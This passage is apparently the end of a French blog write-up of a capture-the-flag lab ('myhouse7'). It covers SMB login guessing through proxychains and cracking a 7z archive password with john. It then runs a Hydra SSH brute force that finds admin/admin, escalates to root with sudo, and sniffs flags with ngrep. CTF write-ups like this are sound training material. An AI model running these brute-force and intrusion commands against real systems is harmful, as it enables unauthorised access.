* Nmap (via le script smb-brute) : n'a rien trouvé
* CrackMapExec : a donné des faux positifs
* [smb-brute-force](https://github.com/curesec/tools/tree/master/smb) de curesec : faux positifs
* Medusa : faux positifs
* [Godance](https://github.com/joohoi/godance) : faux positifs

Et en testant à la mano avec smbclient :  

```plain
$ ./proxychains4 -f proxychains.conf smbclient -U "larryjr" //172.31.200.204/users
[proxychains] config file found: proxychains.conf
[proxychains] preloading ./libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.15-git-1-g7de7dd0
Password for [WORKGROUP\larryjr]:
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.31.200.204:445  ...  OK
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Oct 28 21:52:38 2018
  ..                                  D        0  Sun Oct 28 21:38:52 2018
  Flag.txt                            A       18  Sun Oct 28 21:52:53 2018

                41019616 blocks of size 1024. 26189980 blocks available
smb: \> lcd /tmp
smb: \> get Flag.txt
getting file \Flag.txt of size 18 as Flag.txt (0,8 KiloBytes/sec) (average 0,8 KiloBytes/sec)
```

Ca passe avec *larryjr* / *larryjr*... On est en 2022 et aucun des outils de bruteforce n'est capable de casser du SMB, ça promet (il manque Metasploit que je n'ai pas testé).  

Le flag obtenu est *{{tryharder:1337}}*

Sur le partage *companyInfo* on a trois fichiers :  

```plain
  Flag.txt                            A       18  Sun Oct 28 21:55:05 2018
  moreinfo.7z                         A      226  Sun Oct 28 22:02:24 2018
  hint.txt                            A       93  Sun Oct 28 22:03:08 2018
```

Un flag (*{{tryharder:2020}}*) et une notice explicative :  

> The password is like {{tryharder:xx}} where xx are two numbers...  
> 
> The password is the flag!!

Comme on s'en doutait l'archive 7z restante est protégée par mot de passe. J'utilise l'utilitaire 7z2john puis je casse en générant les mots de passe possibles à la volée :  

```plain
$ python3 -c 'for i in range(100): print("{{tryharder:" + str(i) + "}}")' | ./john --stdin /tmp/hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (7z, 7-Zip archive encryption [SHA256 128/128 AVX 4x AES])
Cost 1 (iteration count) is 524288 for all loaded hashes
Cost 2 (padding size) is 12 for all loaded hashes
Cost 3 (compression type) is 2 for all loaded hashes
Cost 4 (data length) is 68 for all loaded hashes
Will run 4 OpenMP threads
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
{{tryharder:77}} (moreinfo.7z)     
1g 0:00:00:03  0.3058g/s 24.46p/s 24.46c/s 24.46C/s {{tryharder:64}}..{{tryharder:79}}
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We would have such a very good time
-----------------------------------

Pour terminer intéressons nous au port SSH accessible uniquement depuis l'intéreur du réseau.  

```plain
$ ./proxychains4 -q -f proxychains.conf hydra -e nsr -L /tmp/users.txt -P /tmp/pass.txt ssh://172.31.200.1/
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 153 login tries (l:9/p:17), ~10 tries per task
[DATA] attacking ssh://172.31.200.1:22/
[22][ssh] host: 172.31.200.1   login: admin   password: admin
1 of 1 target successfully completed, 1 valid password found
```

Et à partir de là :  

```plain
$ sudo -l
sudo: unable to resolve host myhouse7
[sudo] password for admin: 
Matching Defaults entries for admin on myhouse7:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on myhouse7:
    (ALL) ALL

$ sudo su
sudo: unable to resolve host myhouse7
root@myhouse7:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

Oups il manque un flag que j'ai du rater sur l'énumération web. Pas de panique, je met un Ngrep en écoute pour matcher *tryharder* puis je scanne le CMS avec Wapiti :  

```plain
wapiti -u http://192.168.1.50:8115/ -v2 --color -m ''
```

Ngrep le voit transiter dans le pages crawlées :  

```plain
$ sudo ngrep -q -d enp3s0 tryharder "host 192.168.1.50"
interface: enp3s0 (192.168.1.0/255.255.255.0)
filter: ( host 192.168.1.50 ) and ((ip || ip6) || (vlan && (ip || ip6)))
match: tryharder
T 192.168.1.47:51848 -> 192.168.1.50:8115 [AP] #160
  token=VEAiR1kR79jMeKa9poYANMNof3VpFKherzzebo7PcofDyOe5pphilyPQ1rHNjHc3&flag=%7B%7Btryharder%3A104%7D%7D&user=alice&pass=Letm3in_
```

Ngrep voit la requête POST générée par Wapiti mais n'a pas vu le flag dans la page web, vraisemblablement parce que le serveur a envoyé sa réponse compressée.  

Si on se rend sur la page de login administrateur du CMS on retrouve bien le flag :  

```html
<input name="flag" type="hidden" value="{{tryharder:104}}">
```

Pour information juste lancer un scan de port Nmap avec Ngrep en parallèle remonte 4 flags différents :)  

Challenge très sympa, il aurait pu gagner à se diversifier sur les failles à exploiter même si ce n'était pas l'objectif premier.  


*Published January 01 2022 at 23:46*